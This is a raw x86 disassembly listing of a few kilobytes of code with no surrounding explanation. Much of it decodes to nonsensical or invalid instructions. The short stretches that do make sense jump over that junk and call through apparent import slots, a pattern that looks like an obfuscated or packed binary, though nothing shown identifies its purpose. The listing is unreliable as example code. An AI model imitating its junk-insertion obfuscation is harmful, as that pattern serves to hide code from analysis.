  4051e7:	aam    0x53
  4051e9:	cmp    al,0xcf
  4051eb:	push   ss
  4051ec:	pop    ebp
  4051ed:	leave  
  4051ee:	sub    al,0x79
  4051f0:	xchg   BYTE PTR [edx],dh
  4051f2:	push   ecx
  4051f3:	enter  0xbcf9,0x9
  4051f7:	inc    ebp
  4051f8:	pop    ecx
  4051f9:	sub    al,0x31
  4051fb:	sub    al,0x2d
  4051fd:	dec    DWORD PTR [bp+di-0x1f]
  405201:	mov    edx,0x71afdd9f
  405206:	pop    ecx
  405207:	lods   eax,DWORD PTR es:[esi]
  405209:	or     al,0x4a
  40520b:	imul   ebp,DWORD PTR [edi+0x76],0x81f6861b
  405212:	aad    0x85
  405214:	fld    TBYTE PTR [esi-0x3e7ad1e]
  40521a:	imul   ebp,DWORD PTR [esi+0x7b4473d2],0xffffffcc
  405221:	cs jb  0x405289
  405224:	scas   eax,DWORD PTR es:[edi]
  405225:	mov    DWORD PTR [ebp+0x10],eax
  405228:	jmp    0x405300
  40522d:	jo     0x405273
  40522f:	inc    esi
  405230:	dec    eax
  405231:	jbe    0x40527d
  405233:	jle    0x4052b1
  405235:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405237:	nop
  405238:	xor    edx,DWORD PTR [eax+0x41337f17]
  40523e:	and    eax,0xbb0000
  405243:	add    BYTE PTR [eax],al
  405245:	add    ah,BYTE PTR [ebx-0x7fa850b8]
  40524b:	jo     0x405284
  40524d:	inc    ebx
  40524e:	push   0x4a
  405250:	stos   BYTE PTR es:[edi],al
  405251:	dec    edx
  405252:	(bad)  
  405253:	hlt    
  405254:	scas   eax,DWORD PTR es:[edi]
  405255:	ficomp WORD PTR [edi+0x39]
  405258:	sub    eax,0x48464523
  40525d:	pop    edi
  40525e:	add    ch,BYTE PTR [eax-0x51302bdf]
  405264:	scas   al,BYTE PTR es:[edi]
  405265:	jnp    0x405278
  405267:	imul   eax,DWORD PTR [esi+0x1b],0xb86da901
  40526e:	inc    ecx
  40526f:	imul   esi,DWORD PTR [esi+0x5353501e],0x7aa5c77e
  405279:	dec    ebx
  40527a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40527b:	or     al,0xf7
  40527d:	pop    ebx
  40527e:	lahf   
  40527f:	mov    ebp,0x74aaa5b
  405284:	imul   esi,esi,0x83931568
  40528a:	jmp    0xa2b8226f
  40528f:	or     ecx,eax
  405291:	and    esi,esi
  405293:	or     al,0xa
  405295:	jle    0x40527b
  405297:	gs js  0x405308
  40529a:	inc    edi
  40529b:	or     bl,bl
  40529d:	xor    esi,DWORD PTR [eax-0x2e]
  4052a0:	(bad)  
  4052a1:	pop    eax
  4052a2:	stos   BYTE PTR es:[edi],al
  4052a3:	push   cs
  4052a4:	outs   dx,DWORD PTR ds:[esi]
  4052a5:	push   esp
  4052a6:	jns    0x4052de
  4052a8:	idiv   DWORD PTR [edi-0x76]
  4052ab:	pop    eax
  4052ac:	jmp    0x4101ef90
  4052b1:	pop    ds
  4052b2:	repz mov esi,0x5efbadee
  4052b8:	popa   
  4052b9:	cwde   
  4052ba:	pop    esp
  4052bb:	and    eax,0xdd1b655
  4052c0:	ss sbb al,dl
  4052c3:	das    
  4052c4:	cs daa 
  4052c6:	repz fst DWORD PTR [edx-0x2a]
  4052ca:	or     DWORD PTR [eax+0x44],esp
  4052cd:	inc    esi
  4052ce:	jne    0x4052b1
  4052d0:	ficomp WORD PTR [ebx]
  4052d2:	xor    ch,BYTE PTR [ecx]
  4052d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052d5:	cmp    DWORD PTR [edi-0x6],eax
  4052d8:	ret    
  4052d9:	sbb    eax,0x863b0c5d
  4052de:	mov    bl,0x99
  4052e0:	and    bl,ah
  4052e2:	jnp    0x4052a1
  4052e4:	dec    ecx
  4052e5:	adc    BYTE PTR [edx-0x6e557b5a],ch
  4052eb:	sbb    BYTE PTR [esi],ah
  4052ed:	jo     0x40529d
  4052ef:	add    al,0xd1
  4052f1:	cmp    edi,ebx
  4052f3:	out    dx,al
  4052f4:	bound  ebp,QWORD PTR [ebx-0x4f224a00]
  4052fa:	mov    esi,0x80fe1d1c
  4052ff:	iret   
  405300:	mov    eax,DWORD PTR [ecx]
  405302:	inc    edx
  405303:	mov    edx,DWORD PTR [ecx+0x4]
  405306:	movzx  edx,WORD PTR ds:0x433598
  40530d:	and    DWORD PTR ds:0x4335bc,edx
  405313:	jmp    0x4053eb
  405318:	pop    eax
  405319:	ds (bad) 
  40531c:	(bad)  
  40531d:	sti    
  40531e:	jg     0x4052de
  405320:	cmp    DWORD PTR [edi+0x15071cd0],ebp
  405326:	popf   
  405327:	ins    DWORD PTR es:[edi],dx
  405328:	cld    
  405329:	and    eax,0xbb0000
  40532e:	add    BYTE PTR [eax],al
  405330:	call   0x3a99:0x234c2c72
  405337:	retf   
  405338:	sbb    al,0xe6
  40533a:	ja     0x40539b
  40533c:	lods   eax,DWORD PTR ds:[esi]
  40533d:	dec    esi
  40533e:	push   ebp
  40533f:	push   ss
  405340:	inc    edx
  405341:	addr16 (bad) 
  405344:	jae    0x4053a9
  405346:	shr    DWORD PTR [esi+edx*8-0x7d],cl
  40534a:	cmc    
  40534b:	fadd   st(4),st
  40534d:	or     eax,0x29d8ee6
  405352:	mov    ebp,0xf9c35939
  405357:	xchg   edx,eax
  405358:	xchg   edx,eax
  405359:	sbb    cl,BYTE PTR [ecx]
  40535b:	jl     0x40536c
  40535d:	or     al,0xa9
  40535f:	pop    esp
  405360:	xlat   BYTE PTR ds:[ebx]
  405361:	mov    cl,0xcb
  405363:	call   DWORD PTR [ebx]
  405365:	dec    ecx
  405366:	jge    0x4053da
  405368:	pop    ebx
  405369:	mov    ah,0xa6
  40536b:	jmp    FWORD PTR [edx-0x4b]
  40536e:	inc    ebp
  40536f:	(bad)  
  405370:	(bad)  
  405371:	fimul  WORD PTR ds:0x67b95ec5
  405377:	xor    eax,0xfba92617
  40537c:	not    DWORD PTR [ebx-0xc]
  40537f:	jle    0x4053f1
  405381:	(bad)  
  405382:	repz popf 
  405384:	cmp    BYTE PTR [ecx+ecx*4-0x46],0x26
  405389:	fldenv [ebx-0x7f]
  40538c:	scas   al,BYTE PTR es:[edi]
  40538d:	mov    es,WORD PTR [edx+0x4b21feb]
  405393:	cmp    al,0xf5
  405395:	(bad)  
  405396:	aad    0x4b
  405398:	mov    ah,0x2e
  40539a:	lahf   
  40539b:	in     eax,dx
  40539c:	sub    ecx,DWORD PTR [ebx-0x2aa37874]
  4053a2:	aam    0xa1
  4053a4:	mov    ch,0xac
  4053a6:	and    eax,0x223748f6
  4053ab:	mov    BYTE PTR [ecx+edi*1-0x6],ch
  4053af:	nop
  4053b0:	jbe    0x405418
  4053b2:	mov    edi,0x9a1deb2f
  4053b7:	mov    ds:0x85bdc41,al
  4053bc:	cmp    al,0xb6
  4053be:	xchg   edx,eax
  4053bf:	dec    ebp
  4053c0:	inc    esp
  4053c1:	in     eax,dx
  4053c2:	or     al,0xcc
  4053c4:	ds xchg esi,eax
  4053c6:	mov    bh,0x11
  4053c8:	cdq    
  4053c9:	adc    BYTE PTR [ebx+0x7b],0x88
  4053cd:	les    ebx,FWORD PTR [ebx+0x15a8a0e]
  4053d3:	aad    0x3e
  4053d5:	js     0x4053db
  4053d7:	imul   edx,DWORD PTR [ebx+0x11fd0a5],0x425226ef
  4053e1:	cmp    al,0xb4
  4053e3:	dec    edx
  4053e4:	(bad)  
  4053e5:	sub    bp,WORD PTR [esi+0x33b1c39e]
  4053ec:	(bad)  
  4053ed:	not    edx
  4053ef:	sub    eax,0x66479db3
  4053f4:	mov    edx,DWORD PTR ds:0x433544
  4053fa:	sub    DWORD PTR ds:0x433584,edx
  405400:	imul   eax,DWORD PTR [ebp+0x10]
  405404:	sub    DWORD PTR ds:0x4335e8,edi
  40540a:	mov    edx,eax
  40540c:	movzx  eax,BYTE PTR ds:0x4335f8
  405413:	or     DWORD PTR ds:0x43360c,eax
  405419:	mov    eax,DWORD PTR [ebp-0x24]
  40541c:	or     DWORD PTR ds:0x433574,0x4335f8
  405426:	jmp    0x4054fe
  40542b:	icebp  
  40542c:	out    0xf9,al
  40542e:	in     al,0xff
  405430:	(bad)  
  405431:	std    
  405432:	test   esp,0xb4c735c7
  405438:	cmp    al,0xab
  40543a:	mov    edi,0x26b7
  40543f:	mov    ebx,0x23000000
  405444:	xchg   ebx,esp
  405446:	push   eax
  405447:	sti    
  405448:	shl    BYTE PTR [esi-0x7ad61d49],cl
  40544e:	imul   ecx,DWORD PTR [ebp+0x5c],0x61
  405452:	repz loopne 0x4053ea
  405455:	out    0x14,eax
  405457:	leave  
  405458:	stos   DWORD PTR es:[edi],eax
  405459:	in     eax,0x2b
  40545b:	cmp    BYTE PTR [ebx],dh
  40545d:	mov    eax,gs:0x9a744fce
  405463:	xor    BYTE PTR [edx+0x284546c8],dh
  405469:	or     esp,DWORD PTR [eax+0x5f510a6]
  40546f:	xor    ah,BYTE PTR [edx-0x6773f334]
  405475:	pop    ebx
  405476:	push   edi
  405477:	dec    ebp
  405478:	mov    edi,0xdd3cd8d0
  40547d:	scas   al,BYTE PTR es:[edi]
  40547e:	aaa    
  40547f:	inc    ebx
  405480:	push   0x70
  405482:	paddusw mm6,QWORD PTR [esi]
  405485:	or     al,0xf3
  405487:	lods   eax,DWORD PTR ds:[esi]
  405488:	scas   al,BYTE PTR es:[edi]
  405489:	mov    ch,0xb9
  40548b:	(bad)  
  40548c:	push   edx
  40548d:	aam    0x5d
  40548f:	inc    edi
  405490:	mov    ebx,0xe9b82a0d
  405495:	call   0xf09d82ca
  40549a:	sub    BYTE PTR [esi+ecx*2-0x48],cl
  40549e:	outs   dx,DWORD PTR ds:[esi]
  40549f:	ret    0x5353
  4054a2:	pop    esi
  4054a3:	addr16 mov edi,0xa2e9cbac
  4054a9:	aaa    
  4054aa:	and    edi,DWORD PTR [eax+0x2e]
  4054ad:	enter  0x3362,0xde
  4054b1:	pop    eax
  4054b2:	(bad)  
  4054b3:	mov    dl,0xa6
  4054b5:	adc    eax,0xa62eebec
  4054ba:	mov    DWORD PTR [esi+0x2a],esp
  4054bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054be:	dec    ebp
  4054bf:	push   cs
  4054c0:	add    DWORD PTR [edx-0x3edda622],ecx
  4054c6:	lahf   
  4054c7:	cmp    BYTE PTR [edi-0x1d],0xf7
  4054cb:	jno    0x4054bf
  4054cd:	test   eax,0x717691c1
  4054d2:	mov    ?,eax
  4054d4:	les    esi,FWORD PTR [edx]
  4054d6:	jp     0x4054c9
  4054d8:	lea    esi,[ebx+0x3144ca86]
  4054de:	mov    WORD PTR [eax+0x10cdbcb5],es
  4054e4:	loope  0x405526
  4054e6:	mov    DWORD PTR [edx],edi
  4054e8:	add    eax,0x21e6fdc2
  4054ed:	jl     0x40553c
  4054ef:	mov    bl,0x7a
  4054f1:	in     eax,dx
  4054f2:	int    0x91
  4054f4:	sub    DWORD PTR [esi+eax*8+0x12],ebp
  4054f8:	xor    eax,0xbedc7f0e
  4054fd:	sub    DWORD PTR ds:[eax],edx
  405500:	mov    DWORD PTR ds:0x43360c,0x461a
  40550a:	jmp    0x4058f9
  40550f:	mov    edx,DWORD PTR ds:0x4336e4
  405515:	mov    edx,DWORD PTR [edx]
  405517:	and    DWORD PTR ds:0x43362c,edx
  40551d:	mov    DWORD PTR [ebp-0x24],eax
  405520:	mov    eax,DWORD PTR [ebp+0x20]
  405523:	cmp    DWORD PTR ds:0x4335bc,0x0
  40552a:	ja     0x405558
  405530:	sbb    DWORD PTR ds:0x433604,0x36a7
  40553a:	dec    edx
  40553b:	jmp    0x405558
  405540:	push   DWORD PTR [ebp-0x10]
  405543:	push   0x402c
  405548:	push   0x2bd9
  40554d:	push   0x8efe
  405552:	call   DWORD PTR ds:0x43c7d8
  405558:	mov    edx,DWORD PTR [ebp+0x24]
  40555b:	xor    eax,esi
  40555d:	mov    DWORD PTR [ebp+0x10],eax
  405560:	mov    eax,DWORD PTR [edi]
  405562:	mov    edx,DWORD PTR [edi+0x4]
  405565:	adc    DWORD PTR ds:0x433600,0x10cb
  40556f:	jmp    0x405647
  405574:	jg     0x405552
  405576:	dec    eax
  405577:	jne    0x405564
  405579:	cmc    
  40557a:	jg     0x40555a
  40557c:	mov    ebx,0x201c8213
  405581:	inc    ebp
  405582:	pusha  
  405583:	pop    edi
  405584:	jb     0x4055ad
  405586:	add    BYTE PTR [eax],al
  405588:	mov    ebx,0x92000000
  40558d:	sar    BYTE PTR [esi-0x79412393],0xb5
  405594:	cmp    eax,0x96f4de52
  405599:	ror    DWORD PTR [edx-0x5b011cf3],1
  40559f:	jmp    0x95bf:0xaec0a385
  4055a6:	sbb    ebx,DWORD PTR [esi+0x2e6132f]
  4055ac:	pop    ecx
  4055ad:	stos   DWORD PTR es:[edi],eax
  4055ae:	ret    
  4055af:	ret    0xdb0d
  4055b2:	sub    ch,BYTE PTR [edi]
  4055b4:	xchg   DWORD PTR [edi-0x443c4999],esp
  4055ba:	push   0xa04293a
  4055bf:	adc    eax,0x230c54ef
  4055c4:	aas    
  4055c5:	ss ret 0xf48
  4055c9:	xor    eax,0x93e2875a
  4055ce:	das    
  4055cf:	lock cld 
  4055d1:	push   ebp
  4055d2:	sar    DWORD PTR [ebx+0x270921c3],1
  4055d8:	rcl    al,0x36
  4055db:	sub    al,0xf2
  4055dd:	popa   
  4055de:	rcr    BYTE PTR [ecx-0x25],cl
  4055e1:	mov    edi,edi
  4055e3:	(bad)  
  4055e5:	inc    esp
  4055e6:	aad    0xcf
  4055e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055e9:	hlt    
  4055ea:	dec    ecx
  4055eb:	and    edi,DWORD PTR [esi-0x52]
  4055ee:	aam    0x86
  4055f0:	ins    BYTE PTR es:[edi],dx
  4055f1:	dec    esi
  4055f2:	out    0xd6,eax
  4055f4:	xchg   BYTE PTR [edx-0x65],dh
  4055f7:	xchg   ebp,eax
  4055f8:	inc    esi
  4055f9:	cmp    al,0xd2
  4055fb:	jmp    0x3e2d51a1
  405600:	xchg   edx,eax
  405601:	fwait
  405602:	lea    eax,[edx-0x1eeb9d01]
  405608:	cli    
  405609:	ja     0x4055eb
  40560b:	sbb    cl,ah
  40560d:	pop    edi
  40560e:	pop    ss
  40560f:	jae    0x40567d
  405611:	xchg   ebp,eax
  405612:	dec    BYTE PTR [eax-0x23]
  405615:	sbb    eax,0x9553e5a
  40561a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40561b:	add    esi,eax
  40561d:	pop    eax
  40561e:	scas   eax,DWORD PTR es:[edi]
  40561f:	dec    eax
  405620:	fnstenv [ecx-0x76e4ad66]
  405626:	out    dx,al
  405627:	xor    BYTE PTR [esi],0x84
  40562a:	shl    BYTE PTR [esi-0x10edb197],cl
  405630:	sbb    edx,DWORD PTR [edi]
  405632:	adc    ebp,ebp
  405634:	hlt    
  405635:	popa   
  405636:	push   esi
  405637:	mov    cl,0x4e
  405639:	mov    esi,0xa13e3e80
  40563e:	out    0xf,eax
  405640:	aas    
  405641:	add    esp,ecx
  405643:	xchg   DWORD PTR [edi+esi*2+0x10558bfc],eax
  40564a:	jmp    0x405722
  40564f:	je     0x40561a
  405651:	jne    0x4056a1
  405653:	std    
  405654:	(bad)  
  405655:	jg     0x405652
  405657:	push   0x5c
  405659:	inc    ecx
  40565a:	or     eax,0xcd4862e0
  40565f:	sub    eax,0xbb000028
  405664:	add    BYTE PTR [eax],al
  405666:	add    dh,cl
  405668:	(bad)  
  405669:	cmc    
  40566a:	xor    ebx,0x23de4bf9
  405670:	into   
  405671:	sbb    ecx,DWORD PTR [ecx]
  405673:	or     al,0x92
  405675:	or     ch,BYTE PTR [esi+0x1e]
  405678:	xchg   bh,ah
  40567a:	ror    BYTE PTR [si-0x64],1
  40567e:	sbb    al,0xad
  405680:	xor    BYTE PTR [eax-0x72],dh
  405683:	jg     0x4056e4
  405685:	sar    BYTE PTR [edx-0x38],1
  405688:	ret    
  405689:	scas   eax,DWORD PTR es:[edi]
  40568a:	icebp  
  40568b:	test   al,0xf0
  40568d:	push   eax
  40568e:	int3   
  40568f:	jnp    0x40567b
  405691:	lods   al,BYTE PTR ds:[esi]
  405692:	jno    0x4056d0
  405694:	out    0x53,al
  405696:	repnz mov edx,0xc4c07d7e
  40569c:	cs push eax
  40569e:	and    eax,0xd8e19ef7
  4056a3:	cmp    al,0x71
  4056a5:	adc    DWORD PTR ds:0xa538e676,ebx
  4056ab:	ret    0xb428
  4056ae:	aad    0x2c
  4056b0:	xchg   esi,eax
  4056b1:	test   al,0x2c
  4056b3:	dec    esi
  4056b4:	mov    dl,0xf
  4056b6:	sub    DWORD PTR [edi],0x6e
  4056b9:	sub    BYTE PTR [eax+ebp*2],ch
  4056bc:	(bad)  
  4056bd:	in     al,dx
  4056be:	jb     0x4056af
  4056c0:	out    0x2,eax
  4056c2:	fidiv  DWORD PTR [esi-0x13]
  4056c5:	xor    al,0x26
  4056c7:	sbb    eax,0xab529efc
  4056cc:	imul   ebp,DWORD PTR [edx-0x3a792c02],0x2a
  4056d3:	dec    ebx
  4056d4:	mov    edi,0xb404f70e
  4056d9:	sti    
  4056da:	adc    eax,0xdcba9177
  4056df:	cli    
  4056e0:	xchg   edi,eax
  4056e1:	dec    esp
  4056e2:	fistp  WORD PTR [esp+eax*8-0x5ef265c7]
  4056e9:	mov    es,WORD PTR [edx+0x2b]
  4056ec:	push   ebp
  4056ed:	push   0xffffffa8
  4056ef:	ins    BYTE PTR es:[edi],dx
  4056f0:	sub    eax,DWORD PTR [ebp+0x410cfa96]
  4056f6:	ud0    ebp,DWORD PTR [esi+0x76]
  4056fa:	dec    ecx
  4056fb:	mov    ds:0x3a9d2a59,al
  405700:	inc    edx
  405701:	jae    0x4056ce
  405703:	mov    al,0x2e
  405705:	sbb    BYTE PTR [ebx+eiz*1],bh
  405708:	ret    
  405709:	pop    ss
  40570a:	jmp    0x8325:0x223853f6
  405711:	fidivr WORD PTR [ecx]
  405713:	pop    ds
  405714:	iret   
  405715:	push   0xfffffff6
  405717:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405718:	adc    BYTE PTR [ebx-0x60],0xb8
  40571c:	sar    BYTE PTR [edi],0xf
  40571f:	dec    edx
  405720:	dec    ebx
  405721:	xchg   BYTE PTR [ebx],dh
  405723:	mov    BYTE PTR [ecx+0x43364835],0x0
  40572a:	inc    esp
  40572b:	add    BYTE PTR [bx+si],al
  40572e:	jmp    0x405806
  405733:	mov    al,0xfb
  405735:	mov    edx,0xfff5fbf5
  40573a:	call   ebp
  40573c:	retw   0xd6cd
  405740:	cdq    
  405741:	mov    cl,0xe4
  405743:	call   0xbb405770
  405748:	add    BYTE PTR [eax],al
  40574a:	add    al,ah
  40574c:	test   al,0xdf
  40574e:	(bad)  
  40574f:	shr    DWORD PTR [eax-0x45d36870],cl
  405755:	scas   eax,DWORD PTR es:[edi]
  405756:	dec    ebx
  405757:	mov    cl,BYTE PTR [ebp+0x4c9f05cd]
  40575d:	idiv   BYTE PTR [eax+0x625b318]
  405763:	pop    edx
  405764:	pop    eax
  405765:	cmp    BYTE PTR [edi],al
  405767:	scas   al,BYTE PTR es:[edi]
  405768:	or     eax,0x2c11ab6d
  40576d:	mov    eax,ds:0x3e3c77f5
  405772:	sbb    ch,BYTE PTR ds:0x6a04c42c
  405778:	js     0x4057c2
  40577a:	sub    bl,BYTE PTR [edx+0x574c55e4]
  405780:	pop    edx
  405781:	arpl   WORD PTR [ecx+0x40],ax
  405784:	jmp    0xf83c:0x398cfe0
  40578b:	int3   
  40578c:	xor    eax,0x542c733e
  405791:	inc    ecx
  405792:	or     DWORD PTR [ecx-0x2616b231],ebx
  405798:	mov    ch,0xe2
  40579a:	dec    edx
  40579b:	cli    
  40579c:	stc    
  40579d:	or     edi,DWORD PTR [edi+0x7b]
  4057a0:	mov    ds:0xb1e3dc92,al
  4057a5:	mov    DWORD PTR [ebp+eiz*1-0x5f16b00d],esi
  4057ac:	xchg   ebx,eax
  4057ad:	xor    al,0x43
  4057af:	pop    esp
  4057b0:	mov    cl,0x14
  4057b2:	outs   dx,BYTE PTR ds:[esi]
  4057b3:	add    eax,0x9bf899f8
  4057b8:	mov    dl,0x33
  4057ba:	cld    
  4057bb:	(bad)  
  4057bc:	out    dx,al
  4057bd:	shl    BYTE PTR [ebx+0x1b65c033],1
  4057c3:	(bad)  
  4057c4:	cld    
  4057c5:	das    
  4057c6:	mov    ebp,0x84220e74
  4057cb:	cmp    eax,0x448d1e2
  4057d0:	jno    0x4057ec
  4057d2:	repnz fadd QWORD PTR [ecx-0x5061ddf9]
  4057d9:	dec    eax
  4057da:	pop    edi
  4057db:	push   0x5c90e98
  4057e0:	aam    0xfe
  4057e2:	in     eax,dx
  4057e3:	mov    ecx,0x46abd25b
  4057e8:	loopne 0x405805
  4057ea:	int3   
  4057eb:	std    
  4057ec:	es add bh,al
  4057ef:	inc    eax
  4057f0:	add    ch,BYTE PTR [ebx-0x46588615]
  4057f6:	push   esi
  4057f7:	js     0x405826
  4057f9:	push   ebp
  4057fa:	mov    esp,0xf1e1df7
  4057ff:	mov    ch,0xc1
  405801:	mov    al,ds:0x5efb8a29
  405806:	lea    edx,[eax+edx*1+0x3370c49a]
  40580d:	xor    eax,0x5f42
  405812:	jmp    0x4058ea
  405817:	mov    ebx,0xdf1293e7
  40581c:	jbe    0x4057d9
  40581e:	out    dx,eax
  40581f:	xchg   ebx,eax
  405820:	(bad)  
  405821:	aad    0xde
  405823:	outs   dx,DWORD PTR ds:[esi]
  405824:	dec    edx
  405825:	test   dh,bl
  405827:	mov    ds:0xbb000029,eax
  40582c:	add    BYTE PTR [eax],al
  40582e:	add    BYTE PTR [ebx-0x4b588ffa],dl
  405834:	sub    al,0xb3
  405836:	jns    0x40585c
  405838:	jb     0x405806
  40583a:	dec    eax
  40583b:	ins    DWORD PTR es:[edi],dx
  40583c:	arpl   WORD PTR [edi],cx
  40583e:	jle    0x4057d9
  405840:	jle    0x4057df
  405842:	imul   esp,DWORD PTR [ebp-0x12],0xfffffff3
  405846:	aam    0x24
  405848:	adc    BYTE PTR [edx],ch
  40584a:	adc    al,BYTE PTR [ebx+eax*2]
  40584d:	inc    eax
  40584e:	or     BYTE PTR [eax],al
  405850:	dec    esi
  405851:	xchg   BYTE PTR [ebx+0x70a1ea0f],al
  405857:	std    
  405858:	fstp   st(5)
  40585a:	adc    ah,BYTE PTR [esi+ebp*4+0x23]
  40585e:	add    dl,al
  405860:	and    edi,DWORD PTR [ecx-0x1614951e]
  405866:	in     al,dx
  405867:	dec    ebx
  405868:	cmp    edi,DWORD PTR [edi]
  40586a:	xor    esi,DWORD PTR [edx-0x71]
  40586d:	mov    fs,WORD PTR [edi]
  40586f:	cs mov dl,0x9b
  405872:	lea    edi,[ebp+0x2bdbb6c3]
  405878:	and    ah,BYTE PTR [ecx-0x44]
  40587b:	dec    DWORD PTR [edx]
  40587d:	add    dh,cl
  40587f:	mov    gs,WORD PTR [ecx-0x209f2343]
  405885:	clc    
  405886:	and    eax,DWORD PTR [ebp-0x20960556]
  40588c:	arpl   bx,di
  40588e:	enter  0xb4e0,0xe
  405892:	daa    
  405893:	ret    0xea90
  405896:	sub    DWORD PTR [ebx+0x1b4642],ebx
  40589c:	(bad)  
  40589e:	inc    ebx
  40589f:	xor    al,0xf5
  4058a1:	sub    esp,DWORD PTR [ebx+eax*1-0x7f988a85]
  4058a8:	out    0xfe,al
  4058aa:	in     eax,0x6a
  4058ac:	or     DWORD PTR [edi-0x1c],eax
  4058af:	fmul   st,st(3)
  4058b1:	stos   BYTE PTR es:[edi],al
  4058b2:	dec    esi
  4058b3:	sbb    eax,0x522b4f4e
  4058b8:	lock neg ah
  4058bb:	jmp    0x4058e7
  4058bd:	inc    ecx
  4058be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058bf:	lods   eax,DWORD PTR fs:[esi]
  4058c1:	xchg   BYTE PTR [ecx],ch
  4058c3:	mov    eax,gs
  4058c5:	data16 adc cl,dl
  4058c8:	add    eax,ebx
  4058ca:	outs   dx,BYTE PTR ds:[esi]
  4058cb:	ret    0x485f
  4058ce:	mov    dh,0xf9
  4058d0:	push   eax
  4058d1:	mov    esi,0xf1596481
  4058d6:	or     al,0x99
  4058d8:	test   al,0x6e
  4058da:	dec    eax
  4058db:	mov    DWORD PTR [ebx+0x5e],0x866d6aaa
  4058e2:	pop    edx
  4058e3:	push   0xd461175a
  4058e8:	sub    DWORD PTR [esi-0x7e23ba75],edx
  4058ee:	adc    eax,0x433588
  4058f3:	and    al,0x36
  4058f5:	inc    ebx
  4058f6:	add    BYTE PTR [ecx],al
  4058f8:	adc    BYTE PTR [ecx],cl
  4058fa:	sbb    eax,0x433638
  4058ff:	jmp    0x4059d7
  405904:	test   dh,bh
  405906:	cld    
  405907:	sub    bh,dh
  405909:	sub    dl,dh
  40590b:	(bad)  
  40590c:	xor    DWORD PTR [ebx+edi*8-0x502f6222],ecx
  405913:	cmp    DWORD PTR [esi+0x2a],ebx
  405916:	add    BYTE PTR [eax],al
  405918:	mov    ebx,0xb8000000
  40591d:	(bad)  [ebx-0x58e20531]
  405923:	add    eax,0x2ebc4d31
  405928:	loope  0x40592b
  40592a:	dec    ebx
  40592b:	mov    BYTE PTR [ebp+0x24a10ea7],bh
  405931:	fiadd  DWORD PTR [eax-0x446d0bfa]
  405937:	add    ecx,eax
  405939:	jnp    0x405972
  40593b:	scas   eax,DWORD PTR es:[edi]
  40593c:	enter  0x4238,0x85
  405940:	inc    edx
  405941:	icebp  
  405942:	and    esi,DWORD PTR [eax-0x8ed573]
  405948:	sbb    BYTE PTR [eax],dl
  40594a:	push   cs
  40594b:	add    DWORD PTR [ebp-0x38],0x21
  40594f:	add    ecx,DWORD PTR [ecx+esi*8+0x66]
  405953:	js     0x4059c9
  405955:	and    DWORD PTR fs:[ebp+0x2a],edx
  405959:	mov    edi,0x1de24200
  40595e:	mov    eax,0x9ad5ab73
  405963:	call   0x5284:0x8b5cc627
  40596a:	mov    BYTE PTR [ebx],al
  40596c:	add    al,0x39
  40596e:	imul   ebp,DWORD PTR [ecx],0x97a178db
  405974:	leave  
  405975:	loopne 0x40591e
  405977:	fst    DWORD PTR [edx+0x29]
  40597a:	inc    esp
  40597b:	or     al,0x32
  40597d:	adc    eax,0x22baba7b
  405982:	hlt    
  405983:	(bad)  
  405985:	(bad)  
  405986:	out    dx,al
  405987:	mov    esi,0x3902c220
  40598c:	or     edi,DWORD PTR [edx+0xa]
  40598f:	push   DWORD PTR [ebx+0x52]
  405992:	pop    ebp
  405993:	pop    ebp
  405994:	dec    edx
  405995:	out    dx,al
  405996:	sti    
  405997:	ror    DWORD PTR [edi+0x7],1
  40599a:	jle    0x405928
  40599c:	std    
  40599d:	js     0x4059bd
  40599f:	repz jno 0x405927
  4059a2:	sub    DWORD PTR [eax-0x1],edx
  4059a5:	mov    ds:0xb573d22d,eax
  4059aa:	push   cs
  4059ab:	in     al,0xa
  4059ad:	xchg   ebp,eax
  4059ae:	push   edi
  4059af:	std    
  4059b0:	fcom   st(7)
  4059b2:	leave  
  4059b3:	cmp    eax,0xffb17b24
  4059b8:	inc    ecx
  4059b9:	(bad)  
  4059ba:	mov    DWORD PTR [eax-0x37d26581],edi
  4059c0:	pushf  
  4059c1:	push   0x55
  4059c3:	lods   eax,DWORD PTR ds:[esi]
  4059c4:	std    
  4059c5:	add    eax,0x587e4f84
  4059ca:	imul   ebp,DWORD PTR [edi-0x15],0x4f
  4059ce:	pushf  
  4059cf:	mov    eax,0x2442c59
  4059d4:	scas   eax,DWORD PTR es:[edi]
  4059d5:	jmp    0xc8862119
  4059da:	ror    DWORD PTR [edi-0x15],cl
  4059dd:	jmp    0x405997
  4059df:	(bad)  
  4059e1:	(bad)  
  4059e2:	dec    DWORD PTR [ecx+0x3d83cc45]
  4059e8:	sub    BYTE PTR [esi],dh
  4059ea:	inc    ebx
  4059eb:	add    BYTE PTR [eax],al
  4059ed:	jbe    0x405a01
  4059f3:	jmp    0x405a01
  4059f8:	push   DWORD PTR [ebp-0x14]
  4059fb:	call   DWORD PTR ds:0x43c7e8
  405a01:	mov    DWORD PTR [ebp-0x28],0xebeb4fd4
  405a08:	mov    DWORD PTR [ebp-0x24],eax
  405a0b:	mov    DWORD PTR [ebp-0x20],0xebeb4fd5
  405a12:	mov    DWORD PTR [ebp-0x1c],eax
  405a15:	jmp    0x405aed
  405a1a:	push   esi
  405a1b:	or     eax,DWORD PTR [ebx-0x65]
  405a1e:	pop    edi
  405a1f:	fcmovnu st,st(6)
  405a21:	iret   
  405a22:	jg     0x405a4c
  405a24:	pop    ecx
  405a25:	fiadd  WORD PTR [eax]
  405a27:	xlat   BYTE PTR ds:[ebx]
  405a28:	add    DWORD PTR [edx],eax
  405a2a:	sbb    DWORD PTR [ebx],ebp
  405a2c:	add    BYTE PTR [eax],al
  405a2e:	mov    ebx,0xe5000000
  405a33:	fistp  WORD PTR [edi+0x76]
  405a36:	adc    bh,BYTE PTR [ebx-0x61]
  405a39:	scas   al,BYTE PTR es:[edi]
  405a3a:	ja     0x405a1b
  405a3c:	lea    ebp,[esi-0x22a33052]
  405a42:	stc    
  405a43:	mov    WORD PTR [ecx],ss
  405a45:	data16 sub BYTE PTR [ecx],bh
  405a48:	push   0xb906642d
  405a4d:	mov    ebx,0xd0f27745
  405a52:	xor    al,0xef
  405a54:	sbb    al,0x54
  405a56:	stos   DWORD PTR es:[edi],eax
  405a57:	push   ecx
  405a58:	mov    esi,0x6c915d20
